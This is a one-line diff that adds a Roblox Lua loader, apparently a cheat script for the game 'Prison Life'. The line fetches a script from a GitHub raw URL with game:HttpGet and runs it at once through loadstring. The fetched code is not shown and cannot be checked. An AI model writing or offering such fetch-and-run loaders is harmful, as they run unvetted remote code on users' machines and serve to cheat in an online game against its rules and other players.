@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeux45/Prison-Life/main/Script.lua"))()
